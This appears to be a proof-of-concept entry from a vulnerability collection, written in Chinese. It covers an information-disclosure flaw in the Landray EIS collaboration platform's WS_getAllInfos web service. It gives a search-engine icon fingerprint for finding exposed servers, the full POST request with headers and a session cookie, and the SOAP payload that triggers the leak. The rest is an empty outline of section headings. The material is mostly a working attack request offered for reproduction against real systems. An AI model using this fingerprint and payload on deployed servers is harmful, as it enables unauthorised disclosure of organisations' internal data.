# 蓝凌EIS智慧协同平台WS_getAllInfos存在信息泄露漏洞

- **系统**：蓝凌EIS智慧协同平台　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`web.icon=="585275a4cc54b8414554d03e1359a101"`
- **请求**：`POST /WS/Basic/Basic.asmx HTTP/1.1`
- **关键头**：`Cookie: ASP.NET_SessionId=u1n0cky5q5giplqhpajjrf55; FIOA_IMG_FOLDER=FI`　`SOAPAction: http://tempuri.org/WS_getAllInfos`　`Content-Type: text/xml;charset=UTF-8`　`Content-Length: 214`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:WS_getAllInfos/>
</soapenv:Body>
</soapenv:Envelope>
```

**其他**
- 蓝凌 EIS智慧协同平台WS\_getAllInfos存在信息泄露漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 蓝凌EIS智慧协同办公平台